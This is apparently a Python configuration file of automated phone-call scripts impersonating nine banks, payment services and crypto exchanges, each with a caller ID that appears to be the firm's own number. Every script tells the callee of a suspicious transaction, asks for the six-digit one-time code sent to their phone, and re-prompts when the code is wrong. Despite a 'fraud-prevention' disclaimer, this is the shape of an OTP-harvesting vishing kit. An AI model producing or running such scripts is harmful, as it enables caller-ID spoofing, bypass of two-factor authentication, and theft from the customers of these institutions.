# scripts.py
# Authorized-use IVR scripts only.
# These templates are intended for permitted, contractual fraud-prevention use.

SCRIPTS = {

    "capital_one": {
        "caller_id": "+18884622650",
        "languages": {
            "en-US": {
                "intro": "Capital One security alert. We detected a suspicious transaction attempt.",
                "recording": "This call may be recorded for security and quality purposes. Press 1 to continue.",
                "otp": "Please enter the six digit one time code we sent to your mobile phone.",
                "menu": "Press 1 if you recognize this transaction. Press 2 if you do not. Press 9 to speak with an agent.",
                "safe": "Thank you. Your account is secure and no further action is needed.",
                "fraud": "Thank you. We have secured your account and will continue monitoring.",
                "escalate": "Please hold while we connect you to a fraud specialist.",
                "retry": "The code entered was incorrect. Please try again."
            }
        }
    },

    "chase": {
        "caller_id": "+18009359935",
        "languages": {
            "en-US": {
                "intro": "Chase fraud prevention. We identified a suspicious transaction.",
                "recording": "This call may be recorded. Press 1 to proceed.",
                "otp": "Enter the six digit verification code sent to your phone.",
                "menu": "Press 1 to confirm the transaction. Press 2 to report fraud. Press 9 for an agent.",
                "safe": "Your account remains secure. No further action is required.",
                "fraud": "We are securing your account now. Thank you.",
                "escalate": "Please stay on the line while we transfer you.",
                "retry": "That code was not valid. Please try again."
            }
        }
    },

    "bank_of_america": {
        "caller_id": "+18004321000",
        "languages": {
            "en-US": {
                "intro": "Bank of America security notification regarding a recent transaction.",
                "recording": "This call may be monitored or recorded. Press 1 to continue.",
                "otp": "Please enter the six digit security code sent to your device.",
                "menu": "Press 1 if this was you. Press 2 if it was not. Press 9 to reach an agent.",
                "safe": "Your account is secure. Thank you for confirming.",
                "fraud": "We have protected your account and will follow up if needed.",
                "escalate": "Connecting you to a fraud representative now.",
                "retry": "Incorrect code. Please try again."
            }
        }
    },

    "wells_fargo": {
        "caller_id": "+18008693557",
        "languages": {
            "en-US": {
                "intro": "Wells Fargo alert. We detected unusual activity.",
                "recording": "This call may be recorded. Press 1 to proceed.",
                "otp": "Enter the six digit code we sent you.",
                "menu": "Press 1 to approve. Press 2 to deny. Press 9 for assistance.",
                "safe": "Your account is secure. Thank you.",
                "fraud": "Your account has been secured.",
                "escalate": "Please hold while we connect you.",
                "retry": "That code was incorrect. Please try again."
            }
        }
    },

    "citi": {
        "caller_id": "+18009502499",
        "languages": {
            "en-US": {
                "intro": "Citibank fraud alert regarding a recent transaction.",
                "recording": "This call may be recorded for security. Press 1 to continue.",
                "otp": "Enter the six digit code sent to your phone.",
                "menu": "Press 1 to confirm. Press 2 to report fraud. Press 9 for an agent.",
                "safe": "Your account is secure.",
                "fraud": "We have taken steps to protect your account.",
                "escalate": "Please hold while we transfer you.",
                "retry": "Invalid code. Please try again."
            }
        }
    },

    "amex": {
        "caller_id": "+18005284800",
        "languages": {
            "en-US": {
                "intro": "American Express security alert.",
                "recording": "This call may be recorded. Press 1 to continue.",
                "otp": "Please enter your six digit verification code.",
                "menu": "Press 1 if you recognize the charge. Press 2 if not. Press 9 for an agent.",
                "safe": "Thank you. Your account is safe.",
                "fraud": "We are securing your account now.",
                "escalate": "Connecting you to a representative.",
                "retry": "The code was incorrect. Please try again."
            }
        }
    },

    "paypal": {
        "caller_id": "+18882211616",
        "languages": {
            "en-US": {
                "intro": "PayPal security alert regarding a recent login or transaction.",
                "recording": "This call may be recorded. Press 1 to proceed.",
                "otp": "Enter the six digit security code.",
                "menu": "Press 1 to confirm activity. Press 2 to report unauthorized use. Press 9 for support.",
                "safe": "Your PayPal account is secure.",
                "fraud": "We have secured your PayPal account.",
                "escalate": "Please hold while we connect you.",
                "retry": "Incorrect code. Please try again."
            }
        }
    },

    "coinbase": {
        "caller_id": "+18889040144",
        "languages": {
            "en-US": {
                "intro": "Coinbase security alert regarding your account.",
                "recording": "This call may be recorded. Press 1 to continue.",
                "otp": "Please enter the six digit verification code.",
                "menu": "Press 1 if this was you. Press 2 if not. Press 9 to speak to support.",
                "safe": "Your account is secure.",
                "fraud": "We have secured your account.",
                "escalate": "Please hold while we transfer you.",
                "retry": "That code was invalid. Please try again."
            }
        }
    },

    "kraken": {
        "caller_id": "+18773081214",
        "languages": {
            "en-US": {
                "intro": "Kraken exchange security alert.",
                "recording": "This call may be recorded. Press 1 to proceed.",
                "otp": "Enter the six digit security code.",
                "menu": "Press 1 to approve. Press 2 to deny. Press 9 for assistance.",
                "safe": "Your account is secure.",
                "fraud": "Your account has been secured.",
                "escalate": "Please hold while we connect you.",
                "retry": "Incorrect code. Please try again."
            }
        }
    }
}
